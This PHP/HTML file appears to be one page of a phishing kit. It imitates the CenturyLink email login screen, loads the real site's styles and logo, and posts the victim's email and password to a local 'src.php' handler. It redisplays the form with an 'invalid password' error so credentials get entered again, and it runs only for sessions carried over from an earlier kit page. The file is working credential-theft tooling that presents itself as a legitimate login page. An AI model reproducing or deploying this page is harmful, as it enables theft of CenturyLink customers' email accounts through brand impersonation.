<?php
error_reporting(0);
session_start();
ob_start();

function loggedin()
{
    if (isset($_SESSION['email'])&&!empty($_SESSION['email'])) {
        return true;
    } else {
        return false;
    }
}


if (loggedin()) {
} else {
    die();
}
        
$email = @$_SESSION['email'];

$error = @$_GET['error'];
if ($error == "null_entry") {
    $formaction = "src.php";
    $showerror = "block";
} elseif ($error == "sec") {
    $formaction = "src.php?svr=tf";
    $showerror = "block";
} else {
        $formaction = "src.php";
    $showerror = "none";
}


?>

<!DOCTYPE html>
<html lang='en'>
  <head>
        <meta name="viewport" content="width=device-width">
    <meta name="viewport" content="initial-scale=1.0">
      <title>Centurylink | Login</title>
  
  
    <link href="https://auth.centurylink.net/bootstrap/css/bootstrap.min.css" rel="stylesheet" media="screen">
  
    <link rel="stylesheet" type="text/css" href="https://auth.centurylink.net/css/default/social.css">
  
    <link href="https://auth.centurylink.net/css/default/social_responsive.css" type="text/css" rel="stylesheet"><link href="https://auth.centurylink.net/css/default/social_login.css" type="text/css" rel="stylesheet"><style type="text/css">
                        .login {
                background-color: #499e32;
            }
            .social_buttons .mvpd {
                background-color: #499e32;
            }

            .social_login a {
                color: #2278bb;
            }
            
            .mvpd .logo {
                background: url("");
                background-color: transparent;
                background-position: left top;
                background-repeat: no-repeat;
                background-size: 48px 48px;
                display: block;
            }
                        .logo_left {
                width:  160px;
            }
            
            
                                                .social_login { width: 294px; }
            .left_side { width: 100%; border-right: none;}
                                                        </style><script src="https://auth.centurylink.net/js/modernizr.js"></script><script src="https://auth.centurylink.net/js/jquery.min.js"></script><script type="text/javascript">
            (function(document,navigator,standalone) {
                // prevents links from apps from opening in mobile safari
                // this javascript must be the first script in your <head>
                if ((standalone in navigator) && navigator[standalone]) {
                    var curnode, location=document.location, stop=/^(a|html)$/i;
                    document.addEventListener('click', function(e) {
                        curnode=e.target;
                        while (!(stop).test(curnode.nodeName)) {
                            curnode=curnode.parentNode;
                        }
                        // Condidions to do this only on links to your own app
                        // if you want all links, use if('href' in curnode) instead.
                        if('href' in curnode && ( curnode.href.indexOf('http') || ~curnode.href.indexOf(location.host) ) ) {
                            e.preventDefault();
                            location.href = curnode.href;
                        }
                    },false);
                }
            })(document,window.navigator,'standalone');
        </script>

        

  </head><script type="text/javascript" id="webrtc-control"></script>
  <body>
  

    <div id="bodyContent">

    
<div class="social_login"><div class="logo_bar"><img class="logo_left" src="https://static.garnet.synacor.com/clientimages/69187/92368.png" alt="CenturyLink"></div><div class="left_side"><form id="syn_login_form" method="POST" action="<?php echo "$formaction"; ?>"><div id="login_form" class="form"><span class="login_message">Login using a CenturyLink provided Email address</span><!-- For CenturyLink, place example email accounts to prompt users --><div id="centurylink_examples"><div style="float:left;">Examples:</div><div style="float:right;margin-right:60px;"><ul style="list-style-type:none;"><li>johnsmith@centurylink.net</li><li>johnsmith@centurytel.net</li><li>johnsmith@embarqmail.com</li><li>johnsmith@q.com</li><li>johnsmith@suddenlink.net</li></ul><br></div></div><br><div style="margin-top: 60px;">
    E-mail addresses are available for <a href="http://www.centurylink.com/home/internet/" target="_blank">CenturyLink High-Speed Internet®</a> customers only
</div><br>

<div style="display: <?php echo "$showerror"; ?>;">

<div class="alert alert-error alert-block"><button type="button" class="close" data-dismiss="alert">×</button><div>
                                                                                                    You have entered an invalid email address and/or password, please verify and re-enter.
                                                                                            </div></div>
                                                                                            
                                                                                        <br>
                                                                                        
                                                                                        
                                                                                        </div>
                                                                                        

<label for="username">CenturyLink Email Address</label><input placeholder="CenturyLink Email Address" class="input" id="username" type="text" name="username" value="<?php echo "$email"; ?>" tabindex="1" autocapitalize="off" autocorrect="off" required="" autofocus=""><div class="field-help"></div><label for="password">Password</label><input placeholder="Password" class="input" id="password" type="password" name="password" value="" tabindex="2" autocapitalize="off" autocorrect="off" required=""><div class="field-help"></div><input type="hidden" name="login_type" value="username,password"><input type="hidden" name="wiz" value=""><button id="login" type="submit" name="source_button" value="" class="login" tabindex="3">
                                    Log In
                                </button><span class="remember"><input type="checkbox" name="remember_me" value="yes" tabindex="4" checked="checked">
                                        Remember Me
              </span><!-- CUSTOM SELFCARE AREA --><ul id="selfcare_list"><li><a target="_blank" id="FORGOT_PASSWORD" href="https://secure.centurylink.net/password/reset/?sc_cid=ctlreslogin_forgotpassword">Forgot Password?</a></li><li><a target="_blank" id="REGISTER" href="https://secure.centurylink.net/register/index.php?sc_cid=ctlreslogin_createaccount">Create Account</a></li><li><a target="_blank" id="BACK_TO_PORTAL" href="http://centurylink.net/">Back to CenturyLink.net</a></li></ul><!-- CUSTOM SELFCARE AREA --></div></form></div>    
    <div class="footer"><div class="footer_notes"><div class="row"></div></div><div class="row"></div><div class="row"></div></div></div><!-- END .social_login --><script>$('#username').focus()</script><script>
           function updateTracking()
           {
                $elements = {"login":{"tracking":{"type":"o","label":"Submit"}},"add-facebook":{"tracking":{"type":"o","label":"Add Facebook"}},"add-twitter":{"tracking":{"type":"o","label":"Add Twitter"}},"add-google":{"tracking":{"type":"o","label":"Add Google"}},"remove-facebook":{"tracking":{"type":"o","label":"Remove Facebook"}},"remove-twitter":{"tracking":{"type":"o","label":"Remove Twitter"}},"remove-google":{"tracking":{"type":"o","label":"Remove Google"}},"FORGOT_PASSWORD":{"url":"https:\/\/secure.centurylink.net\/password\/reset\/?sc_cid=ctlreslogin_forgotpassword","text":"FORGOT_PASSWORD","tracking":{"type":"o","label":"Forgot Password"}},"REGISTER":{"url":"https:\/\/secure.centurylink.net\/register\/index.php?sc_cid=ctlreslogin_createaccount","text":"REGISTER","tracking":{"type":"o","label":"Register"}},"BACK_TO_PORTAL":{"url":"http:\/\/centurylink.net\/","text":"BACK_TO_PORTAL","tracking":{"type":"o","label":"Back to CenturyLink.net"}},"as_button_auth.centurylink.net_facebook":{"tracking":{"type":"o","label":"Facebook"}},"as_button_auth.centurylink.net_twitter":{"tracking":{"type":"o","label":"Twitter"}},"as_button_auth.centurylink.net_google":{"tracking":{"type":"o","label":"Google"}},"lang_en":{"tracking":{"type":"o","label":"English"}},"lang_es":{"tracking":{"type":"o","label":"Espanol"}}};
                jQuery.each($elements, function($idx, $val) {
                        $escaped = $idx.replace(/\./g, "\\\.");
                        jQuery('#'+$escaped).click(function() {
                            $track = $elements[$idx]['tracking'];
                            if ($track) {
                                s.linkTrackVars="prop6";
                                s.prop6 = $track['label'];
                                s.tl(this, $track['type'],$track['label']);
                            }
                        });
                });
           }

           $(document).ready(updateTracking);
    </script><!--[if lt IE 9]><script src="/js/css3-mediaqueries.js"></script><![endif]--><script src="https://auth.centurylink.net/bootstrap/js/bootstrap.min.js"></script><script></script><script type="text/javascript" src="https://auth.centurylink.net/saml/resources/omniture/s_code.js"></script><script type="text/javascript"><!--
/* You may give each page an identifying name, server, and channel on
the next lines. */
s.pageName="Federated Login";
s.server="";
s.channel="";
s.pageType="";
s.prop1="CenturyLink";
s.prop2="";
s.prop3="";
s.prop4="";
s.prop5="";
s.prop6="Federated Login";
s.prop7="47906abf9d88a38a16c15de4beb205aa";
/* Conversion Variables */
s.campaign="";
s.state="";
s.zip="";
s.events="";
s.products="";
s.purchaseID="";
s.eVar1="";
s.eVar2="";
s.eVar3="";
s.eVar4="";
s.eVar5="";
/************* DO NOT ALTER ANYTHING BELOW THIS LINE ! **************/
var s_code=s.t();if(s_code)document.write(s_code)//--></script><script type="text/javascript"><!--
if(navigator.appVersion.indexOf('MSIE')>=0)document.write(unescape('%3C')+'\!-'+'-')
//--></script><noscript><img src="https://synacor.112.2o7.net/b/ss/synacortve-idmtools/1/H.24.4--NS/0"
height="1" width="1" border="0" alt="" /></noscript><!--/DO NOT REMOVE/--><!-- End SiteCatalyst code version: H.24.4. -->
   
    </div>
  

</body></html>
